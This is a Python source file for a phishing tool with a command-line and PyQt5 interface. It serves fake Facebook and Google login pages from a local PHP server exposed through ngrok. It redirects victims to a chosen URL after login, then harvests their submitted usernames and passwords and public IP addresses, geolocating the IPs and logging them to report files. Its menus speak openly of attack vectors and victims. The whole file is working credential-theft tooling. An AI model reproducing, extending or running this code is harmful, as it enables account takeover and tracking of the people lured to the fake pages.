import json
import multiprocessing
import os
from os import system, path
import re
from urllib.request import urlopen
from sys import stdout, argv, exit
from PyQt5 import QtCore
import time,subprocess as sp
from datetime import datetime
import ctypes

class Phishing_cli():
    def __init__(self):
        if "nt" in os.name:
            self.dirk: str = str(sp.getoutput('powershell pwd'))
            self.dirk: str = self.dirk.replace(" ", "").replace("\r", "").replace("\n", "").replace("'", "").replace("Path", "").replace("--", "")
            if ("\\Phishing" not in self.dirk):
                self.dirk += "\\Phishing"
        else:
            self.dirk: str = str(sp.getoutput('pwd'))
            if ("/Phishing" not in self.dirk):
                self.dirk += "/Phishing"

    def check_need(self):
        try:
            if 256 != system('which php > /dev/null'):
                print("PHP INSTALLATION FOUND")
            else:
                print("{ PHP NOT FOUND: \n Please install PHP and run me again.http://www.php.net/")
                exit()
        except:
            if 256 != system('where php'):
                print("PHP INSTALLATION FOUND")
            else:
                print("{ PHP NOT FOUND: \n Please install PHP and run me again.http://www.php.net/")
                exit()

        try:
            is_admin = os.getuid() == 0
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if (is_admin):
            print("good")
        else:
            print("run with root,Administrator permission")
            exit()

    def runPhishing(self,page, customOption,dirk):
        if "nt" in os.name:
            system('powershell rm -Force ' + dirk + '\\Server\\www\\*.* && powershell rm -Force ' + dirk + '\\Server\\www\\* && copy '
                   + dirk + '\\WebPages\\ip.php ' + dirk + '\\Server\\www\\  && copy '
                   + dirk + '\\Server\\CapturedData\\login.php ' + dirk + '\\Server\\www\\ && echo 1> ' + dirk + '\\Server\\www\\usernames.txt && echo 1 > ' + dirk + '\\Server\\www\\ip.txt')
            print("jjj",dirk)
            if customOption == '1' and page == 'Facebook':
                system("powershell copy -r " + dirk + "\\WebPages\\fb_standard\\*  " + dirk + "\\Server\\www\\")
            elif customOption == '2' and page == 'Facebook':
                system("powershell copy -r " + dirk + "\\WebPages\\fb_advanced_poll\\*  " + dirk + "\\Server\\www\\")
            elif customOption == '3' and page == 'Facebook':
                system("powershell copy -r " + dirk + "\\WebPages\\fb_security_fake\\*  " + dirk + "\\Server\\www\\")
            elif customOption == '4' and page == 'Facebook':
                system("powershell copy -r " + dirk + "\\WebPages\\fb_messenger\\*  " + dirk + "\\Server\\www\\")
            elif customOption == '1' and page == 'Google':
                system("powershell copy -r " + dirk + "\\WebPages\\google_standard\\*  " + dirk + "\\Server\\www\\")
            elif customOption == '2' and page == 'Google':
                system("powershell copy -r " + dirk + "\\WebPages\\google_advanced_poll\\*  " + dirk + "\\Server\\www\\")
            elif customOption == '3' and page == 'Google':
                system("powershell copy -r " + dirk + "\\WebPages\\google_advanced_web\\*  " + dirk + "\\Server\\www\\")
        else:
            system(
                'rm -Rf ' + dirk + '/Server/www/*.*  && cp ' + dirk + '/WebPages/ip.php ' + dirk + '/Server/www/  && cp ' + dirk + '/Server/CapturedData/login.php ' + dirk + '/Server/www/ && echo > ' + dirk + '/Server/www/usernames.txt && echo > ' + dirk + '/Server/www/ip.txt')
            print("jjj", dirk)
            if customOption == '1' and page == 'Facebook':
                system("cp -r " + dirk + "/WebPages/fb_standard/*  " + dirk + "/Server/www/")
            elif customOption == '2' and page == 'Facebook':
                system("cp -r " + dirk + "/WebPages/fb_advanced_poll/*  " + dirk + "/Server/www/")
            elif customOption == '3' and page == 'Facebook':
                system("cp -r " + dirk + "/WebPages/fb_security_fake/*  " + dirk + "/Server/www/")
            elif customOption == '4' and page == 'Facebook':
                system("cp -r " + dirk + "/WebPages/fb_messenger/*  " + dirk + "/Server/www/")
            elif customOption == '1' and page == 'Google':
                system("cp -r " + dirk + "/WebPages/google_standard/*  " + dirk + "/Server/www/")
            elif customOption == '2' and page == 'Google':
                system("cp -r " + dirk + "/WebPages/google_advanced_poll/*  " + dirk + "/Server/www/")
            elif customOption == '3' and page == 'Google':
                system("cp -r " + dirk + "/WebPages/google_advanced_web/*  " + dirk + "/Server/www/")

    def mainMenu(self):
        if "nt" in os.name:
            system('cls')
            pass
        else:
            system('clear')

        print("------------------------SELECT ANY ATTACK VECTOR FOR YOUR VICTIM:------------------------")
        print("""-1 Facebook\n-2Google""")
        option = input("SCPT >>>  ")
        if option == '1':
            customOption = input(
                "\nOperation mode:\nStandard Page Phishing\n1 Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n2 Facebook Phishing- Fake Security issue(security_mode) \n3 Facebook Phising-Messenger Credentials(messenger_mode) \nSCPT >>> ")
            self.runPhishing('Facebook', customOption,self.dirk)
        elif option == '2':
            customOption = input(
                "\nOperation mode:\n Standard Page Phishing\n1 Advanced Phishing(poll_mode/login_with)\n2 New Google Web\nscpt >>> ")
            self.runPhishing('Google', customOption,self.dirk)

    def inputCustom(self,custom,dirk):
        if 'http://' in custom or 'https://' in custom:
            pass
        else:
            custom = 'http://' + custom
        if "nt" in os.name:
            with open(dirk + '\\Server\\www\\login.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open(dirk + '\\Server\\www\\login.php', 'w')
            f.write(c)
            f.close()
        else:
            with open(dirk + '/Server/www/login.php') as f:
                read_data = f.read()
            c = read_data.replace('<CUSTOM>', custom)
            f = open(dirk + '/Server/www/login.php', 'w')
            f.write(c)
            f.close()

    def runServer(self,port):
        if "nt" in os.name:
            system("powershell Stop-Process -Id (Get-NetTCPConnection -LocalPort %s).OwningProcess -Force " % (port))
            system("cd " + self.dirk + "\\Server\\www\\ && powershell Start-Process -NoNewWindow  powershell 'php -S 127.0.0.1:%s'  " % (port))
        else:
            system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
            system("cd " + self.dirk + "/Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))


    def runNgrok(self,port,dirk):
        if "nt" in os.name:
            system("powershell Start-Process -NoNewWindow powershell '"+dirk + "\\.\\Server\\ngrok http {} ' ".format(port))
            time.sleep(3)
            # system("powershell Invoke-WebRequest -Uri http://localhost:4040/api/tunnels -UseBasicParsing > " + dirk + "\\tunnels.json")
            system("curl  http://localhost:4040/api/tunnels > " + dirk + "\\tunnels.json")
            with open(dirk + '\\tunnels.json') as data_file:
                datajson = json.load(data_file)
            msg = "ngrok URL's: \n"
            for i in datajson['tunnels']:
                msg = msg + i['public_url'] + '\n'
            return msg
        else:
            system("chmod +x "+dirk + '/./Server/ngrok ')
            system(dirk + '/./Server/ngrok http {} > /dev/null &'.format(port))
            time.sleep(3)
            # """  curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p'    """
            system("curl  http://localhost:4040/api/tunnels > " + dirk + "/tunnels.json")
            with open(dirk + '/tunnels.json') as data_file:
                datajson = json.load(data_file)
            msg = "ngrok URL's: \n"
            for i in datajson['tunnels']:
                msg = msg + i['public_url'] + '\n'
            return msg

    def getCredentials(self):
        print(
            " Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n"
            "________________________________________________________________________________\n")
        crides_nm = ""
        crides_nm2 = ""
        try:
            date = str(datetime.today().strftime('%Y-%m-%d'))
            if "nt" in os.name:
                dirk2 = self.dirk.replace('\\Phishing', '\\Reports\\phishing\\')
                diroping = self.dirk + '\\Server\\www\\usernames.txt'
                diroping_ip = self.dirk + '\\Server\\www\\ip.txt'
            else:
                dirk2 = self.dirk.replace('/Phishing', '/Reports/phishing/')
                diroping = self.dirk + '/Server/www/usernames.txt'
                diroping_ip = self.dirk + '/Server/www/ip.txt'
            while True:
                with open(diroping) as creds:
                    lines = creds.read().rstrip()
                    if len(lines) != 0:
                        if lines not in crides_nm2:
                            crides_nm2 += lines
                            print(lines)
                            with open(dirk2 + date + "_phishing.json", "a") as dop:
                                dop.write(lines)
                                dop.write("\n")
                                dop.close()
                        else:
                            pass
                with open(diroping_ip) as creds:
                    lines = creds.read().rstrip()
                    if len(lines) != 0:
                        ip = re.search("Victim Public IP: (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\n,\r]", lines).group(1)
                        resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                        ipinfo = json.loads(resp.read().decode(
                            resp.info().get_param('charset') or 'utf-8'))
                        if 'bogon' in ipinfo:
                            print(' \n\n[ VICTIM IP BONUS ]\n {0}{2}{1}'.format(
                                lines))
                            if str(lines) not in crides_nm:
                                crides_nm += str(lines)
                                print(lines)
                            else:
                                pass
                        else:
                            pass
                        if str(ipinfo) not in crides_nm:
                            crides_nm += str(ipinfo)
                            print(ipinfo)
                            with open(dirk2 + date + "_phishing.json", "a") as dop:
                                dop.write(str(ipinfo))
                                dop.write("\n")
                                dop.close()
                        else:
                            pass
                creds.close()
        except:
            pass

class GUI(QtCore.QThread):

        Gui_Date_output = QtCore.pyqtSignal(object)

        def __init__(self, port, customOption, pages_type,redk) -> None:
            QtCore.QThread.__init__(self)
            self.PHish = Phishing_cli()
            self.port = port
            self.customOption = customOption
            self.pages_type = pages_type
            self.redk = redk
            if "nt" in os.name:
                self.dirk: str = str(sp.getoutput('powershell pwd'))
                self.dirk = self.dirk.replace(" ", "").replace("\r", "").replace("\n", "").replace("'", "").replace("Path", "").replace( "--", "")
                if ("\\Phishing" not in self.dirk):
                    self.dirk += "\\Phishing"
            else:
                self.dirk: str = str(sp.getoutput('pwd'))
                if ("/Phishing" not in self.dirk):
                    self.dirk += "/Phishing"

        def getCredentials(self):
            print(
                " Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n"
                "________________________________________________________________________________\n")
            crides_nm = ""
            crides_nm2 = ""
            try:
                date = str(datetime.today().strftime('%Y-%m-%d'))
                if "nt" in os.name:
                    dirk2 = self.dirk.replace('\\Phishing', '\\Reports\\phishing\\')
                    dropingk = self.dirk + '\\Server\\www\\usernames.txt'
                    dropingips = self.dirk + '\\Server\\www\\ip.txt'
                else:
                    dirk2 = self.dirk.replace('/Phishing', '/Reports/phishing/')
                    dropingk = self.dirk + '/Server/www/usernames.txt'
                    dropingips = self.dirk + '/Server/www/ip.txt'
                while True:
                    with open(dropingk) as creds:
                        lines = creds.read().rstrip()
                        if len(lines) != 0:
                            if lines not in crides_nm2:
                                crides_nm2 += lines
                                print(lines)
                                self.Gui_Date_output.emit(str(lines))
                                time.sleep(1)
                                QtCore.QCoreApplication.processEvents()
                                with open(dirk2 + date + "_phishing.json", "a") as dop:
                                    dop.write(lines)
                                    dop.write("\n")
                                    dop.close()
                            else:
                                pass
                    with open(dropingips) as creds:
                        lines = creds.read().rstrip()
                        if len(lines) != 0:
                            ip = re.search("Victim Public IP: (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[\n,\r]",
                                           lines).group(1)
                            resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                            ipinfo = json.loads(resp.read().decode(
                                resp.info().get_param('charset') or 'utf-8'))
                            if 'bogon' in ipinfo:
                                print(' \n\n[ VICTIM IP BONUS ]\n {0}{2}{1}'.format(
                                    lines))
                                if str(lines) not in crides_nm:
                                    crides_nm += str(lines)
                                    print(lines)
                                    self.Gui_Date_output.emit(str(lines))
                                    time.sleep(1)
                                    QtCore.QCoreApplication.processEvents()
                                else:
                                    pass
                            else:
                                pass
                            if str(ipinfo) not in crides_nm:
                                crides_nm += str(ipinfo)
                                print(ipinfo)
                                self.Gui_Date_output.emit(str(ipinfo))
                                time.sleep(1)
                                QtCore.QCoreApplication.processEvents()
                                with open(dirk2 + date + "_phishing.json", "a") as dop:
                                    dop.write(str(ipinfo))
                                    dop.write("\n")
                                    dop.close()
                            else:
                                pass
                    creds.close()
            except:
                pass

        def run(self) -> None:

            self.PHish.check_need()

            self.PHish.runPhishing(self.pages_type, self.customOption,self.dirk)

            self.PHish.inputCustom(self.redk,self.dirk)

            self.PHish.runServer(self.port)
            url = self.PHish.runNgrok(self.port,self.dirk)
            print(url)
            self.Gui_Date_output.emit(str(url))
            time.sleep(1)
            QtCore.QCoreApplication.processEvents()
            multiprocessing.Process(target=self.PHish.runServer, args=(self.port,)).start()
            self.getCredentials()
if __name__ == '__main__':
    try:
        PHish = Phishing_cli()
        PHish.check_need()
        PHish.mainMenu()

        if "nt" in os.name:
            system('cls')
            pass
        else:
            system('clear')
        print('''\nChoose Wisely As Your Victim Will Redirect to This Link''')
        print(
            '''\nDo not leave it blank. Unless Errors may occur''')
        print(
            '''\nInsert a custom redirect url:''')
        custom = str(input('''\nREDIRECT HERE>>> '''))
        PHish.inputCustom(custom,PHish.dirk)

        port = 56
        PHish.runServer(port)
        url = PHish.runNgrok(port,PHish.dirk)
        print(url)
        multiprocessing.Process(target=PHish.runServer, args=(port,)).start()
        if "nt" in os.name:
            while True:
                PHish.getCredentials()
        else:
            PHish.getCredentials()

    except KeyboardInterrupt:
        if "nt" in os.name:
            system('taskkill /IM "ngrok.exe" /F')
        else:
            system('sudo pkill ngrok')
        exit()




